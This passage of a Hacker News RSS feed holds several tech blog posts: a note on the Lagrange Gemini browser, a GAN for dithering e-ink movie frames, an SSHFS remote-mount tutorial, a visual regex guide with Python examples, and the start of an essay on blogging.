<p><img src="https://gmi.skyjake.fi/lagrange/lagrange_about.png" title="Screenshot (showing &quot;skyjake.fi/lagrange/&quot;)"></p>
<h2>Features</h2>

<ul>
<li>Beautiful typography using Unicode fonts</li>
<li>Autogenerated page style and Unicode icon for each Gemini domain</li>
<li>Smart suggestions when typing the URL â€” search bookmarks, history, identities</li>
<li>Sidebar for page outline, managing bookmarks and identities, and viewing history</li>
<li>Multiple tabs</li>
<li>Identity management â€” create and use TLS client certificates</li>
<li>Audio playback: MP3, Ogg Vorbis, WAV</li>
<li>And more! Open `about:help` in the app, or see help.gmi</li>
</ul>



<h2>Downloads</h2>




<p>On Linux and other platforms, you'll need to compile the source tarball (CMake).</p>

<h2>What's new?</h2>

<h3>v0.9</h3>
<ul>
<li>Navigating to parent directory or site root (via top banner, menus, keybindings).</li>
<li>Option for monospace body text on all Gopher/Gemini pages.</li>
<li>Gopher: Command line Gopher URLs; updated .desktop file.</li>
<li>Remembering visited URLs during redirections. Note: "visited.txt" format changed, beware if downgrading to 0.8.</li>
<li>Various bug fixes.</li>
</ul>

<h2>Feedback</h2>

<p>If you have questions, comments or improvement ideas, you can reach me via:</p>





<h2>See also</h2>




</div></div>]]>
            </description>
            <link>https://gmi.skyjake.fi/lagrange/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25090565</guid>
            <pubDate>Sat, 14 Nov 2020 05:47:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A GAN to generate dithers minimising frame difference for a slow movie player]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25090215">thread link</a>) | @fkramink
<br/>
November 13, 2020 | http://matpalm.com/blog/dithernet_vsmp/ | <a href="https://web.archive.org/web/*/http://matpalm.com/blog/dithernet_vsmp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
  
<p>it's been about two years since i first saw the awesome
   <a href="https://medium.com/s/story/very-slow-movie-player-499f76c48b62">very slow movie player</a>
   project by bryan boyer. i thought it was such an excellent idea but never got around
   to buying the hardware to make one. more recently though i've seen a couple of references
   to the project so i decided it was finally time to make one.
</p>
<p>one interesting concern about an eink very slow movie player is the screen refresh. simpler
   eink screens refresh by doing a full cycle of a screen of white or black before displaying
   the new image. i hated the idea of an ambient slow player doing this every few minutes
   as it switched frames, so i wanted to make sure i got a piece of hardware that could do
   incremental update.
</p>
<p>after a bit of shopping around i settled on a
   <a href="https://www.waveshare.com/6inch-hd-e-paper-hat.htm">6 inch HD screen from waveshare</a>
</p>
<p>it ticks all the boxes i wanted
</p>
<ul>
 <li>
     6 inch
 </li>

 <li>
     1448×1072 high definition
 </li>

 <li>
     comes with a raspberry pi HAT
 </li>

 <li>
     and, most importantly, support partial refresh
 </li>
</ul>
<p>this screen also supports grey scale, but only with a flashy full cycle redraw,
   so i'm going to stick to just black and white since it supports the partial redraw.
</p>
<p>note: even though the partial redraw is basically instant it does suffer from a ghosting problem;
   when you draw a white pixel over a black one things are fine, but if you draw black over
   white, in the partial redraw, you get a slight ghosting of gray that is present until a
   full redraw :/
</p>


<p>so how do you display an image when you can only show black and white?
   dithering! here's an example of a 384x288 RGB image dithered using
   <a href="https://pillow.readthedocs.io/en/stable/reference/Image.html#PIL.Image.Image.convert">PILS implementation of the Floyd-Steinberg algorithm</a>
</p>
<table>
<tbody><tr><td><img src="http://matpalm.com/blog/imgs/2020/dn/eg.dither.png"></td></tr>
<tr><td>original RGB vs dithered version</td></tr>
</tbody></table>

<p>it makes intuitive sense that you could have small variations in the exact locations of the
   dots as long as you get the densities generally right. s
   so there's a reasonable question then; how do you dither in such a way that you get a
   good result, but with minimal pixel changes from a previous frame? (since we're
   motivated on these screens to change as little as possible)
</p>
<p>there are two approaches i see
</p>
<p>1) spend 30 minutes googling for a solution that no doubt someone came up with 20 years
   ago that can be implemented in 10 lines of c running at 1000fps ...
</p>
<p>2) .... or train an
   <a href="https://jax.readthedocs.io/">jax</a>
   based GAN to generate the dithers with a loss balancing a good dither vs no pixel change. :P
</p>


<p>when building a very slow movie player the most critical decision is...
   what movie to play?
   i really love the 1979 classic <a href="https://www.imdb.com/title/tt0078748/">alien</a>,
   it's such a great dark movie, so i thought i'd go with it.
   the movie is 160,000 frames so at a play back rate of a frame every 200 seconds
   it'll take just over a year to finish.
</p>
<p>note that in this type of problem there is no concern around overfitting.
   we have access to all data going in and so it's fine to overfit as much as we like;
   as long as we're minimising whatever our objective is we're good to go.
</p>


<p>i started with a
   <a href="https://arxiv.org/abs/1505.04597">unet</a>
   that maps 3 channel RGB images to a single channel dither.
</p>
<table>
<tbody><tr><td><img src="http://matpalm.com/blog/imgs/2020/dn/models.v1.png"></td></tr>
<tr><td>v1 architecture</td></tr>
</tbody></table>

<p>i tinkered a bit with the architecture but didn't spend too much time tuning it.
   for the final v3 result i ended with a pretty vanilla stack of encoders &amp; decoders
   (with skip connections connecting an encoder to the decoder at the same spatial resolution)
   each encoder/decoder block uses a residual like shortcut around a couple of convolutions.
   nearest neighbour upsampling gave a nicer result than deconvolutions in the decoder
   for the v3 result.
   also, <a href="https://arxiv.org/abs/1606.08415">gelu</a> is my new favorite activation :)
</p>
<p>for v1 i used a binary cross entropy loss of P(white) per pixel
   ( since it's what worked well for my
   <a href="http://matpalm.com/blog/counting_bees/">bee counting project</a> )
</p>
<p>as always i started by overfitting to a single example to get a baseline feel for capacity required.
</p>
<table>
<tbody><tr><td>
<img src="http://matpalm.com/blog/imgs/2020/dn/overfit.png">
</td></tr>
<tr><td>
v1 overfit result
</td></tr>
</tbody></table>

<p>when scaling up to the full dataset i switched to training on half resolution images
   against a patch size of 128. working on half resolution consistently gave a better
   result than working with the full resolution.
</p>
<p>as expected though this model gave us the classic type of problem we see with
   straight unet style image translation; we get a reasonable sense of the shapes, but no
   fine details around the dithering.
</p>
<table>
<tbody><tr><td>
<img src="http://matpalm.com/blog/imgs/2020/dn/v1.upsample.png">
</td></tr>
<tr><td>
v1 vanilla unet with upsampling example
</td></tr>
</tbody></table>

<p>side notes:
</p>
<ul>
 <li>
     for this v1 version using deconvolutions in the decoder
     (instead of nearest neighbour upsampling) actually looked pretty good!
     nicely captured texture for a dither with a surprisingly small network.
 </li>

 <li>
     i actually did some experiments using branches in the decoder for both upsampling
     and deconvolutions but the deconvs always dominated too much. i thought that would
     allow the upsampling to work as a kind of residual to the deconv but it never happened.
 </li>
</ul>
<table>
<tbody><tr><td>
<img src="http://matpalm.com/blog/imgs/2020/dn/v1.deconv.png">
</td></tr>
<tr><td>
v1 vanilla unet with deconvolution example
</td></tr>
</tbody></table>



<p>for v2 i added a GAN objective in an attempt to capture finer details
</p>
<table>
<tbody><tr><td>
<img src="http://matpalm.com/blog/imgs/2020/dn/models.v2.png">
</td></tr>
<tr><td>
v2 architecture
</td></tr>
</tbody></table>

<p>i started with the original
   <a href="https://arxiv.org/abs/1611.07004">pix2pix</a>
   objective but reasonably quickly moved to use a
   <a href="https://arxiv.org/abs/1701.07875">wasserstein</a>
   critic style objective since i've always found it more stable.
</p>
<p>the generator (G) was the same as the unet above with the discriminator (D) running patch based.
   at this point i also changed the reconstruction loss from a binary objective to just L1.
   i ended up using batchnorm in D, but not G.
   to be honest i only did a little did of manual tuning, i'm sure there's a better result
   hidden in the hyperparameters somewhere.
</p>
<p>so, for this version, the loss for G has two components
</p>
<pre>1. D(G(rgb))             # fool D
2. L1(G(rgb), dither)    # reconstruct the dither
</pre>

<p>very quickly (i.e. in &lt; 10mins ) we get a reasonable result that is started to
   show some more detail than just the blobby reconstruction.
</p>
<table>
<tbody><tr><td>
<img src="http://matpalm.com/blog/imgs/2020/dn/v2.eg.png">
</td></tr>
<tr><td>
v2 partial trained eg
</td></tr>
</tbody></table>

<p>note: if the loss weight of 2) is 0 we degenerate to v1
   (which proved a useful intermediate debugging step).
   at this point i didn't want to tune to much since the final v3 is coming...
</p>


<p>for v3 we finally introduce a loss relating the previous frame
   (which was one of the main intentions of the project in the first place)
</p>
<p>now G takes not just the RGB image, but the dither of the previous frame.
</p>
<table>
<tbody><tr><td>
<img src="http://matpalm.com/blog/imgs/2020/dn/models.v3.png">
</td></tr>
<tr><td>
v3 architecture
</td></tr>
</tbody></table>

<p>the loss for G now has three parts
</p>
<pre>1. D(G(rgb_t1)) =&gt; real      # fool D
2. L1(G(rgb_t1), dither_t1)  # reconstruct the dither
3. L1(G(rgb_t1), dither_t0)  # don't change too much from the last frame
</pre>

<p>normally with a network that takes as input the same thing it's outputting
   we have to be careful to include things like teacher forcing.
   but since we don't intend to use this network for any kind of rollouts
   we can just always feed the "true" dithers in where required.
   having said that, rolling out the dithers from this network would be interesting :D
</p>


<p>the third loss objective, not changing too many pixels from the last frame,
   works well for generally stationary shots
   but is disastrous for scene changes :/
</p>
<p>consider the following graph for a sequence of frames showing the pixel difference
   between frames.
</p>
<p><img src="http://matpalm.com/blog/imgs/2020/dn/pixel_diff_between_scenes.png"></p><p>when there is a scene change we observe a clear "spike" in pixel diff. my first thought
   was to look for these and do a full redraw for them. it's very straightforward to
   find them (using a simple z-score based anomaly detector on a sliding window) but
   the problem is that it doesn't pick up the troublesome case of a panning shot where we don't
   have a scene change exactly. in these cases there is no abrupt scene change, but there
   are a lot of pixels changing so we end up seeing a lot of ghosting.
</p>
<p>i spent ages tinkering with the best way to approach this before deciding that a simple
   approach of <code>num_pixels_changed_since_last_redraw &gt; threshold</code> was good enough to decide
   if a full redraw was required (with a cooldown to ensure we not redrawing all the time)
</p>


<p>the v3 network gets a very good result <em>very</em> quickly; unsurprisingly since the dither at time
   t0 provided to G is a pretty good estimate of the dither at t1 :)
   i.e. G can get a good result simply by copying it!
</p>
<p>the following scenario shows this effect...
</p>
<p>consider three sequential frames, the middle one being a scene change.
</p>
<p><img src="http://matpalm.com/blog/imgs/2020/dn/v3.scene_eg.1.png"></p><p>at the very start of training the reconstruction loss is dominant and
   we get blobby outlines of the frame.
</p>
<p><img src="http://matpalm.com/blog/imgs/2020/dn/v3.scene_eg.2.png"></p><p>but as the contribution from the dither at time t0 kicks it things look good in general but
   the frames at the scene change end up being a ghosted mix attempt to copy through the old
   frame along with dithering the new one.
   (depending on the relative strength of the loss terms of G).
</p>
<p><img src="http://matpalm.com/blog/imgs/2020/dn/v3.scene_eg.3.png"></p>
<p>so the v3 version generally works and i'm sure with some more tuning i could get a better result
   but, as luck would have it, i actually find the results from v2 more appealing when testing
   on the actual eink screen. so even though the intention was do something like v3 i'm going to end
   up running something more like v2 (as shown in these couple of examples (though the resolution
   does it no justice (not to mention the fact the player will run about 5000 times slower than these
   gifs)))
</p>




<p>i'll update this section when i get a proper frame made (though i might try myself?) but for now the
   prototype lives balanced precariously on a piece of foam below it's younger sibling pi zero eink screen
   running game of life.
</p>
<table>
<tbody><tr><td><img src="http://matpalm.com/blog/imgs/2020/dn/prototype.png"></td></tr>
<tr><td>prototype on desk</td></tr>
</tbody></table>



<ul>
 <li>
     for reconstruction and frame change i used L1 loss, but that's not exactly what we
     want. since we want to avoid the ghosting (white changing to black resulting in grey)
     we should try to avoid white to black but ignore black to white.
 </li>

 <li>
     we might be able to better handle scene changes by also including a
     loss component around the <em>next</em> frame.
 </li>

 <li>
     there's a padding issue where i train G on patches but when it's run on the full res
     version we get an edge artefact the size of the original patch (see image below).
     as a hacky fix i just padded the RGB image before passing it to …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://matpalm.com/blog/dithernet_vsmp/">http://matpalm.com/blog/dithernet_vsmp/</a></em></p>]]>
            </description>
            <link>http://matpalm.com/blog/dithernet_vsmp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25090215</guid>
            <pubDate>Sat, 14 Nov 2020 04:06:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Use local dev tools on remote files with SSHFS]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25090117">thread link</a>) | @ykoll58
<br/>
November 13, 2020 | https://curiousstemlovingfellow.com/posts/sshfs-ubuntu-virtualbox/post/ | <a href="https://web.archive.org/web/*/https://curiousstemlovingfellow.com/posts/sshfs-ubuntu-virtualbox/post/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>November 13, 2020</p><p>I often have to work with virtual machines or remote hosts. To utilize my local development environment while doing so I configure SSH and SSHFS. Enabling the use of tools on the local host while working with files on the remote, with the security of ssh.</p><p><strong>SSHFS</strong> (SSH filesystem) enables the mounting of a remote directory over a normal ssh connection to the local filesystem. Prior to installing, make sure <a href="https://curiousstemlovingfellow.com/posts/ssh-ubuntu-virtualbox/post">SSH is setup</a> with the appropriate keys.</p><ol><li>Download &amp; Install <a href="https://osxfuse.github.io/">FUSE for macOS</a></li><li>Download &amp; Install <a href="https://osxfuse.github.io/">SSHFS</a></li></ol><h2 id="mount-remote-filesystems">Mount remote filesystems<a href="#mount-remote-filesystems" aria-label="mount remote filesystems permalink"></a></h2><p>The following command mounts the remote directory to a specified mount point.</p><pre data-language="" data-index="0"><code><span><span>sshfs username@remotesystem:/remote/path/to/directory ~/mount/point</span></span></code></pre><p>The <a href="https://github.com/tkolleh/dotfiles/blob/master/ws/usrBinScripts/executable_rmount.sh"><code>rmount</code></a> and <a href="https://github.com/tkolleh/dotfiles/blob/master/ws/usrBinScripts/executable_rumount.sh"><code>rumount</code></a> bash scripts facilitate convenient mount and unmounts using <code>sshfs</code>. To begin using the scripts.</p><ol><li>Create a folder named <strong>mounts</strong> in your user home directory, <code>~/mounts</code>.</li><li>Download the scripts and make them executable, <code>chmod u+x &lt;path-to-script&gt;</code>.</li></ol><p>The functions reference host named in the local <code>~/.ssh/config</code> file, configured with a key pair (without a password). See <a href="https://curiousstemlovingfellow.com/posts/ssh-ubuntu-virtualbox/post">earlier blog</a> post on the subject for reference.</p><pre data-language="c" data-index="1"><code><span><span><span>Host ml</span></span></span>
<span><span><span>  HostName ec2-*.compute-</span><span>1.amazonaws.com</span></span></span>
<span><span><span>  User ubuntu</span></span></span>
<span><span><span>  PreferredAuthentications publickey</span></span></span>
<span><span><span>  IdentitiesOnly yes</span></span></span>
<span><span><span>  IdentityFile ~/.ssh/aws</span></span></span>
<span><span><span>  Port </span><span>22</span></span></span></code></pre><p>Executing <code>rmount ml</code> - will mount the entire filesystem to a local <code>ml</code> (<code>~/mounts/ml</code>) folder. A folder created by the function. The default “mounts” path, created earlier, can be changed by modifying the function. Executing <code>rmount ml:/home/ec2-user</code> mounts the <code>ec2-user</code> directory in <code>~/mounts/ml/</code>. Running <code>rumount ml</code>, removes the <code>ml</code> folder and unmounts the remote filesystem. </p><p>With a remote filesystem mounted locally, local development tools can be used without having to download each file or having to remember to sync files. Its a secure tunnel to your remote filesystem where files behave almost as if they’re local.</p><p>I’m publishing this as part of 100 Days To Offload. You can learn more by visiting <a href="https://100daystooffload.com/">#100DaysToOffload</a>.</p><br><blockquote><h2 id="references">References<a href="#references" aria-label="references permalink"></a></h2><ul><li><a href="https://tools.ietf.org/html/rfc4251">The Secure Shell Protocol</a></li><li><a href="https://brettterpstra.com/2013/02/10/the-joy-of-sshfs/">Inspiration</a></li></ul></blockquote><hr><div><div><p><strong>T.J. Kolleh</strong></p><p>Engineer with interests in the development &amp; delivery of A.I. enhanced products. This site is a collection of thoughts about technology, and a way to keep track of research.</p></div></div><ul><li><a rel="prev" href="https://curiousstemlovingfellow.com/posts/ssh-ubuntu-virtualbox/post/">← <!-- -->SSH To Guest or Remote OS</a></li><li></li></ul></div></div>]]>
            </description>
            <link>https://curiousstemlovingfellow.com/posts/sshfs-ubuntu-virtualbox/post/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25090117</guid>
            <pubDate>Sat, 14 Nov 2020 03:39:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Visual Guide to Regular Expression]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25090112">thread link</a>) | @gilad
<br/>
November 13, 2020 | https://amitness.com/regex/ | <a href="https://web.archive.org/web/*/https://amitness.com/regex/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="text">
<p>It’s a common task in NLP to either check a text against a pattern or extract parts from the text that matches a certain pattern. A regular expression or “regex” is a powerful tool to achieve this.</p>
<p>While powerful, regex can feel daunting as it comes with a lot of features and sub-parts that you need to remember.</p>
<p>In this post, I will illustrate the various concepts underlying regex. The goal is to help you build a good mental model of how a regex pattern works.</p>
<h2 id="mental-model">Mental Model</h2>
<p>Let’s start with a simple example where we are trying to find the word ‘cool’ in the text.</p>
<p><img src="https://amitness.com/images/regex-mental-model-example.png" alt=""></p>
<p>With regex, we could simply type out the word ‘cool’ as the pattern and it will match the word.</p>

<p>While regex matched our desired word ‘<strong>cool</strong>’, the way it operates is not at the word level but the character level. This is the key idea.</p>
<blockquote>
<p><strong>Key Idea</strong>: Regex works at the character-level, not word-level.</p>
</blockquote>
<p><img src="https://amitness.com/images/regex-working.png" alt=""></p>
<p>The implication of this is that the regex <code>r'cool'</code> would match the following sentences as well.</p>
<p><img src="https://amitness.com/images/regex-exact-word-match.png" alt=""></p>
<h2 id="basic-building-blocks">Basic Building Blocks</h2>
<p>Now that we understand the key idea, let’s understand how we can match simple characters using regex.</p>
<h3 id="a-specific-character">a. Specific character</h3>
<p>We can simply specify the character in the regular expression and it will match all instances in the text.</p>
<p>For example, a regular expression given below will match all instances of ‘a’ in the text. You can use any of the small and capital alphabets.</p>

<p><img src="https://amitness.com/images/regex-match-only-a.png" alt=""></p>
<p>You can also use any digits from 0 to 9 and it will work as well.</p>

<p><img src="https://amitness.com/images/regex-python-3.7-example.png" alt=""></p>
<p>Note that regex is case-sensitive by default and thus the following regex won’t match anything.</p>

<p><img src="https://amitness.com/images/regex-not-matched-by-capital-a.png" alt=""></p>
<h3 id="b-white-space-character">b. White space character</h3>
<p>We can detect special characters such as whitespace and newlines using special escape sequences.</p>
<p><img src="https://amitness.com/images/regex-white-space-characters.png" alt=""></p>
<p>Besides the common ones above, we have:</p>
<ul>
<li><strong>\r</strong> for carriage return</li>
<li><strong>\f</strong> for form feed</li>
<li><strong>\e</strong> for escape.</li>
</ul>
<h3 id="c-special-sequences">c. Special sequences</h3>
<p>Regex provides a bunch of built-in special symbols that can match a group of characters at once. These begin with backslash <code>\</code>.</p>
<h4 id="pattern-d">Pattern: <code>\d</code></h4>
<p>It matches any single-digit number between 0 to 9.</p>
<p><img src="https://amitness.com/images/regex-single-digit.png" alt=""></p>
<p>Notice that matches are single digit. So we have 4 different matches below instead of a single number <code>18.04</code>.</p>
<p><img src="https://amitness.com/images/regex-ubuntu-18.04.png" alt=""></p>
<h4 id="pattern-s">Pattern: \s</h4>
<p>It matches any whitespace character (<span>space</span>, <span>tab</span> or <span>newline</span>).</p>
<p><img src="https://amitness.com/images/regex-match-any-whitespace.png" alt=""></p>
<h4 id="pattern-w">Pattern: \w</h4>
<p>It matches any of the small alphabets(a to z), capital alphabets(A to Z), digits (0 to 9), and underscore.</p>
<p><img src="https://amitness.com/images/regex-slash-w.png" alt=""></p>
<h4 id="pattern-">Pattern: .</h4>
<p>It matches any character except the new line (\n).</p>
<p><img src="https://amitness.com/images/regex-everything-except-newline.png" alt=""></p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>&gt;&gt;&gt;</span> <span>re</span><span>.</span><span>findall</span><span>(</span><span>r'.'</span><span>,</span> <span>'line 1</span><span>\n</span><span>line2'</span><span>)</span>
<span>[</span><span>'l'</span><span>,</span> <span>'i'</span><span>,</span> <span>'n'</span><span>,</span> <span>'e'</span><span>,</span> <span>' '</span><span>,</span> <span>'1'</span><span>,</span> <span>'l'</span><span>,</span> <span>'i'</span><span>,</span> <span>'n'</span><span>,</span> <span>'e'</span><span>,</span> <span>'2'</span><span>]</span>
</code></pre></div></div>
<h4 id="pattern-negations">Pattern: Negations</h4>
<p>If you use the capitalized versions of the patterns above, they act as negation.</p>
<p>For example, if “\d” matched any digits from 0 to 9, then “\D” will match anything except “0 to 9”.</p>
<p><img src="https://amitness.com/images/regex-negation.png" alt=""></p>
<h3 id="d-character-sets">d. Character sets</h3>
<p>These are patterns starting with <code>[</code> and ending with <code>]</code> and specify the characters that should be matched enclosed by brackets.</p>
<p>For example, the following pattern matches any of the characters ‘a’, ‘e’, ‘i’, ‘o’, and ‘u’.
<img src="https://amitness.com/images/regex-aeiou.png" alt=""></p>
<p>You can also replicate the functionality of <code>\d</code> using the below pattern. It will match any digits between 0 to 9.
<img src="https://amitness.com/images/regex-1-to-9.png" alt=""></p>
<p>Instead of specifying all the digits, we can use <code>-</code> to specify only start and end digits. So, instead of <code>[0123456789]</code>, we can do:</p>
<p><img src="https://amitness.com/images/regex-refactor-all-digits.png" alt=""></p>
<p>For example, <code>[2-4]</code> can be used to match any digits between 2 to 4 i.e. (2 or 3 or 4).</p>
<p><img src="https://amitness.com/images/regex-year-2014-example.png" alt=""></p>
<p>You can even use the special characters we learned previously inside the brackets. For example, you can match any digit from 0 to 9 or whitespace as:</p>
<p><img src="https://amitness.com/images/regex-whitespace-or-digit.png" alt=""></p>
<p>Below, I have listed some useful common patterns and what they mean.</p>
<p><img src="https://amitness.com/images/regex-common-pattern-for-bracket.png" alt=""></p>
<h3 id="e-anchors">e. Anchors</h3>
<p>Regex also has special handlers to make the pattern only match if it’s at the start or end of the string.</p>
<p>We can use the <code>^</code> anchor to match patterns only at the start of a line. For example:</p>
<p><img src="https://amitness.com/images/regex-start-anchor.png" alt=""></p>
<p>Similarly, we can use the <code>$</code> anchor after the character to match patterns only if it’s the end of the line. For example:</p>
<p><img src="https://amitness.com/images/regex-anchor-end.png" alt=""></p>
<h3 id="f-escaping-metacharacters">f. Escaping metacharacters</h3>
<p>Consider a case where we want to exactly match the word “Mr. Stark”.</p>
<p>If we write a regex like <code>Mr. Stark</code>, then it will have an unintended effect. Since we know dot has a special meaning in a regex.</p>
<p><img src="https://amitness.com/images/regex-dot-issue.png" alt=""></p>
<p>So, we should always escape the special metacharacters like <code>.</code>, <code>$</code> etc. if our goal is to match the exact character itself.</p>
<p><img src="https://amitness.com/images/regex-dot-fixed.png" alt=""></p>
<p>Here is the list of metacharacters that you should remember to escape if you’re using them directly.</p>
<div><div><pre><code>^ $ . * + ? { } [ ] \ | ( )
</code></pre></div></div>
<h2 id="repetition-of-basic-blocks">Repetition of basic blocks</h2>
<p>Now that we can pattern match any characters, we could repeat things and start building more complicated patterns.</p>
<h3 id="a-naive-repetition">a. Naive repetition</h3>
<p>Using only what we have learned so far, a naive way would be to just repeat the pattern. For example, we can match two-digit numbers by just repeating the character-level pattern.</p>

<p><img src="https://amitness.com/images/regex-slash-d-slash-d.png" alt=""></p>
<h3 id="b-quantifiers">b. Quantifiers</h3>
<p>Regex provides special quantifiers to specify different types of repetition for the character preceding it.</p>
<h4 id="i-fixed-repetition">i. Fixed repetition</h4>
<p>We can use the <code>{...}</code> quantifier to specify the number of times a pattern should repeat.</p>
<p><img src="https://amitness.com/images/regex-manual-counts.png" alt=""></p>
<p>For example, the previous pattern for matching 2-digit number can be recreated as:</p>
<p><img src="https://amitness.com/images/regex-it-is-2020.png" alt=""></p>
<p>You can also specify a range of repetitions using the same quantifier. For example, to match from 2-digit to 4-digit numbers, we could use the pattern:</p>
<p><img src="https://amitness.com/images/regex-min-max-count.png" alt=""></p>
<p>When applied to a sentence, it will match both 4-digit and 2-digit numbers.</p>
<p><img src="https://amitness.com/images/regex-20-years-old.png" alt=""></p>
<div>
<p><strong>Note:</strong></p><p>
There should not be any space between minimum and maximum count For example, \d{2, 4} doesn't work.
</p>
</div>
<h4 id="ii-flexible-quantifiers">ii. Flexible quantifiers</h4>
<p>Regex also provides quantifiers “*”, “+” and “?” using which you can specify flexible repetition of a character.</p>
<ul>
<li>
<p><strong>0 or 1 times</strong>: <code>?</code><br>
The <code>?</code> quantifier matches the previous character if it repeats 0 or 1 times. This can be useful to make certain parts optional. It is equivalent to <code>{0,1}</code>.</p>
<p><img src="https://amitness.com/images/regex-question-mark-clarify.png" alt=""></p>
<p>For example, let’s say we want to match both the word “sound” and “sound” where “s” is optional. Then, we can use the <code>?</code> quantifier that matches if a character repeats 0 or 1 times.<br>
<img src="https://amitness.com/images/regex-question-mark-example.png" alt=""></p>
</li>
<li>
<p><strong>one or more times</strong>: <code>+</code><br>
The <code>+</code> quantifier matches the previous character if it repeats 1 or more times. It is equivalent to <code>{1,}</code>.</p>
<p>For example, we could find numbers of any arbitrary length using the regex <code>\d+</code>.</p>
<p><img src="https://amitness.com/images/regex-example-of-plus.png" alt=""></p>
</li>
<li>
<p><strong>zero or more times</strong>: <code>*</code><br>
The <code>*</code> quantifier matches the previous character if it repeats zero or more times. It is equivalent to <code>{0,}</code>.</p>
</li>
</ul>
<h2 id="usage-in-python">Usage in Python</h2>
<p>Python provides a module called “re” in the standard library to work with regular expression.</p>
<h3 id="need-for-raw-strings">Need for raw strings</h3>
<p>To specify a regular expression in Python, we precede it with <strong>r</strong> to create raw strings.</p>

<p>To understand why we precede with <strong>r</strong>, let’s try printing the expression <strong>\t</strong> without <code>**r**</code>.</p>
<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>pattern</span> <span>=</span> <span>'</span><span>\t</span><span>'</span>
<span>&gt;&gt;&gt;</span> <span>print</span><span>(</span><span>pattern</span><span>)</span>

</code></pre></div></div>
<p>You can see how when we don’t use raw string, the string <code>\t</code> is treated as the escape character for tab by Python.</p>
<p>Now let’s convert it into raw string. We get back whatever we specified.</p>
<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>pattern</span> <span>=</span> <span>r'\t'</span>
<span>&gt;&gt;&gt;</span> <span>print</span><span>(</span><span>pattern</span><span>)</span>
\<span>t</span>
</code></pre></div></div>
<h3 id="using-re-module">Using re module</h3>
<p>To use <code>re</code> module, we can start by importing the <code>re</code> module as:</p>

<h4 id="1-refindall">1. re.findall</h4>
<p>This function allows us to get all the matches as a list of strings.</p>
<div><div><pre><code><span>import</span> <span>re</span>
<span>re</span><span>.</span><span>findall</span><span>(</span><span>r'\d'</span><span>,</span> <span>'123456'</span><span>)</span>
</code></pre></div></div>
<div><div><pre><code>['1', '2', '3', '4', '5', '6']
</code></pre></div></div>
<h4 id="2-rematch">2. re.match</h4>
<p>This function searches for a pattern at the beginning of the string and returns the first occurrence as a match object. If the pattern is not found, it returns None.</p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>match</span> <span>=</span> <span>re</span><span>.</span><span>match</span><span>(</span><span>r'batman'</span><span>,</span> <span>'batman is cool'</span><span>)</span>
<span>print</span><span>(</span><span>match</span><span>)</span>
</code></pre></div></div>
<div><div><pre><code>&lt;re.Match object; span=(0, 6), match='batman'&gt;
</code></pre></div></div>
<p><img src="https://amitness.com/images/regex-match-object.png" alt=""></p>
<p>With the match object, we can get the matched text as</p>


<p>In a case where our pattern is not at the start of the sentence, we will not get any match.</p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>match</span> <span>=</span> <span>re</span><span>.</span><span>match</span><span>(</span><span>r'batman'</span><span>,</span> <span>'The batman is cool'</span><span>)</span>
<span>print</span><span>(</span><span>match</span><span>)</span>
</code></pre></div></div>

<h4 id="3-research">3. re.search</h4>
<p>This function also finds the first occurrence of a pattern but the pattern can occur anywhere in the text. If the pattern is not found, it returns None.</p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>match</span> <span>=</span> <span>re</span><span>.</span><span>search</span><span>(</span><span>r'batman'</span><span>,</span> <span>'the batman is cool'</span><span>)</span>
<span>print</span><span>(</span><span>match</span><span>.</span><span>group</span><span>())</span>
</code></pre></div></div>

<h2 id="references">References</h2>
<ul>
<li>A.M. Kuchling, <a href="https://docs.python.org/3/howto/regex.html">“Regular Expression HOWTO - Python 3.9.0 documentation”</a></li>
</ul>
</section></div>]]>
            </description>
            <link>https://amitness.com/regex/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25090112</guid>
            <pubDate>Sat, 14 Nov 2020 03:37:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Publish Early, Publish Often]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25089952">thread link</a>) | @nottrobin
<br/>
November 13, 2020 | https://robinwinslow.uk/2020/11/14/publish-early-publish-often/ | <a href="https://web.archive.org/web/*/https://robinwinslow.uk/2020/11/14/publish-early-publish-often/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <p>This may fly in the face of conventional wisdom.</p>



<p>In the last few days Iâ€™ve watched about 20 video tutorials on blogging and read similar nubmer of articles.</p>

<p>One very common refrain from these blogging experts is:</p>

<blockquote>
  <p>just start writing!</p>
</blockquote>

<p>This is great advice. My blog has languished too long because I procrastinate horribly, doing research, tweaking my wording, improving my website styling etc. â€œJust start writingâ€� is clearly the solution to all my problems, if I can do it.</p>

<p>But thereâ€™s another frequent piece of advice that seems to contradict this:</p>

<blockquote>
  <p>quality is king!</p>
</blockquote>

<p>Time was, they say, that you could just write down your stream of consciousness and have a successful blog. No longer. Nowadays, there are so many quality content producers that you need to stand out.</p>

<p>So far, so reasonable.</p>

<p>But then they go on to say that to stay ahead in this cuthroat world of blogging, you need to <em>only publish quality content</em>.</p>

<p>This is the worst thing for me to hear.</p>

<p>Until yesterday, Iâ€™d not published anything for 21 months! The reason? I expect perfection from myself, and nothing less will do. Iâ€™m so intimidated by the enormity of the amazing ground-breaking article Iâ€™m about to write any second now that I just procrastinate starting forever.</p>



<p>In my world of web development, we have a saying:</p>

<blockquote>
